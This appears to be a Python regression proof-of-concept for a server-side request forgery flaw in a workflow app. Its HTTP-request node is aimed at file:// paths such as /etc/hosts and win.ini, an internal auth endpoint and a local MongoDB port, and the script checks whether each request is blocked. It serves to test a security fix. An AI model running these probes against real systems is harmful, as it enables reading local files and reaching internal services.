"""PoC #1B: Multiple SSRF targets — regression assertion.

Tests several SSRF targets to characterize the executor's reach.
After fix: all targets should be blocked (error or no successful response).
Before fix: at least some targets should be reachable.

Usage:
    python poc_ssrf_multi.py --expected=blocked     # default: assert all blocked
    python poc_ssrf_multi.py --expected=vulnerable  # assert exploits still work
"""
import argparse
import json
import os
import sys
import time
import urllib.request

SESSION = os.environ.get("APIWEAVE_SESSION")
CSRF = os.environ.get("APIWEAVE_CSRF")


def req(base, method, path, body=None):
    url = base + path
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Cookie", f"session={SESSION}; csrftoken={CSRF}")
    r.add_header("Content-Type", "application/json")
    if method in ("POST", "PUT", "PATCH", "DELETE"):
        r.add_header("X-CSRF-Token", CSRF)
    try:
        resp = urllib.request.urlopen(r, timeout=15)
        return resp.status, json.loads(resp.read() or b"null")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"null")
    except Exception as e:
        return 0, {"error": str(e)}


def run_workflow(base, url: str) -> dict:
    """Create + run + collect result for a workflow with one HTTP node."""
    wf = {
        "name": f"SSRF PoC - {url[:60]}",
        "nodes": [
            {"nodeId": "s", "type": "start", "label": "Start", "position": {"x":0,"y":0}, "config":{}},
            {"nodeId": "h", "type": "http-request", "label": "Probe", "position": {"x":100,"y":0},
             "config": {"method": "GET", "url": url, "headers": "", "body": "", "bodyType": None, "timeout": 8}},
            {"nodeId": "e", "type": "end", "label": "End", "position": {"x":200,"y":0}, "config":{}},
        ],
        "edges": [
            {"edgeId":"e1","source":"s","target":"h"},
            {"edgeId":"e2","source":"h","target":"e"},
        ],
        "variables": {},
    }
    code, w = req(base, "POST", "/api/workflows", wf)
    if code not in (200, 201):
        return {"workflow_create": code, "error": w}
    wid = w["workflowId"]
    code, run = req(base, "POST", f"/api/workflows/{wid}/run", {})
    if code not in (200, 202):
        return {"run_trigger": code, "error": run}
    rid = run["runId"]
    for _ in range(30):
        time.sleep(0.5)
        code, status = req(base, "GET", f"/api/workflows/{wid}/runs/{rid}")
        if status.get("status") in ("completed", "failed"):
            break
    code, res = req(base, "GET", f"/api/workflows/{wid}/runs/{rid}/nodes/h/result")
    req(base, "DELETE", f"/api/workflows/{wid}")
    return res.get("result", res) if isinstance(res, dict) else res


def _is_blocked(r: dict) -> bool:
    """Return True if the result indicates the request was blocked/errored."""
    if not isinstance(r, dict):
        return True
    sc = r.get("statusCode")
    body = r.get("body", "")
    error = r.get("error", "")
    status = r.get("status", "")
    # Blocked if: error status, or no successful HTTP response, or error message
    if status == "error":
        return True
    if error and any(kw in str(error) for kw in [
        "blocked", "forbidden", "not allowed", "invalid", "denied",
        "Cannot connect", "Connection refused", "Invalid URL",
        "No host", "Unsupported", "SSRF", "disallowed",
    ]):
        return True
    if sc and sc < 400 and body:
        return False  # successful response = NOT blocked
    if sc and sc >= 500:
        return True  # server error = likely blocked or unreachable
    return True  # no successful response = blocked


def main():
    parser = argparse.ArgumentParser(description="Multi-target SSRF PoC regression assertion")
    parser.add_argument(
        "--expected",
        choices=["blocked", "vulnerable"],
        default="blocked",
        help="Expected outcome: 'blocked' (post-fix) or 'vulnerable' (pre-fix)",
    )
    parser.add_argument(
        "--base-url",
        default=os.environ.get("APIWEAVE_BASE_URL", "http://127.0.0.1:8000"),
        help="Backend base URL (default: $APIWEAVE_BASE_URL or http://127.0.0.1:8000)",
    )
    args = parser.parse_args()
    BASE = args.base_url.rstrip("/")
    expected = args.expected

    if not SESSION or not CSRF:
        print("SKIP: Set APIWEAVE_SESSION and APIWEAVE_CSRF env vars")
        sys.exit(0)

    targets = [
        ("file:///C:/Windows/win.ini", "Windows system file (file:// scheme)"),
        ("file:///etc/hosts", "Unix hosts file (file:// scheme)"),
        (f"{BASE}/api/auth/me", "Internal backend with auth probe"),
        ("http://127.0.0.1:27017/", "Local MongoDB port (raw binary)"),
    ]

    print(f"[*] Expected outcome: {expected}")
    print(f"[*] Base URL: {BASE}")

    results = []  # (test_name, passed, detail)
    evidence_lines = [f"poc_ssrf_multi.py — expected={expected}\nbase_url={BASE}\n\n"]

    for url, desc in targets:
        print(f"\n=== Target: {url} ({desc}) ===")
        try:
            r = run_workflow(BASE, url)
        except Exception as e:
            r = {"exception": str(e)}
        print(json.dumps(r, indent=2)[:1500])
        evidence_lines.append(f"--- {url} ({desc}) ---\n{json.dumps(r, indent=2)[:1000]}\n\n")

        blocked = _is_blocked(r)

        if expected == "blocked":
            passed = blocked
            tag = "PASS" if passed else "FAIL"
            detail = f"blocked={blocked}"
            if isinstance(r, dict):
                detail += f", status={r.get('status','')}, error={str(r.get('error',''))[:80]}"
            results.append((f"SSRF blocked: {url[:50]}", passed, detail))
        else:  # vulnerable
            passed = not blocked
            tag = "PASS" if passed else "FAIL"
            detail = f"reachable={not blocked}"
            if isinstance(r, dict):
                detail += f", statusCode={r.get('statusCode','')}, status={r.get('status','')}"
            results.append((f"SSRF reachable: {url[:50]}", passed, detail))

    # --- Report ---
    print("\n" + "=" * 60)
    print("ASSERTION RESULTS")
    print("=" * 60)
    all_pass = True
    for name, passed, detail in results:
        tag = "PASS" if passed else "FAIL"
        if not passed:
            all_pass = False
        print(f"  [{tag}] {name}")
        print(f"         {detail}")

    # Save evidence
    evidence_path = os.path.join(
        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
        ".omo", "evidence", "task-6-poc-ssrf-multi.txt",
    )
    try:
        os.makedirs(os.path.dirname(evidence_path), exist_ok=True)
        with open(evidence_path, "w", encoding="utf-8") as f:
            f.writelines(evidence_lines)
            f.write("\nAssertions:\n")
            for name, passed, detail in results:
                f.write(f"  [{'PASS' if passed else 'FAIL'}] {name}: {detail}\n")
            f.write(f"\nOverall: {'PASS' if all_pass else 'FAIL'}\n")
        print(f"\n[*] Evidence saved to {evidence_path}")
    except Exception as e:
        print(f"[!] Could not save evidence: {e}")

    sys.exit(0 if all_pass else 1)


if __name__ == "__main__":
    main()
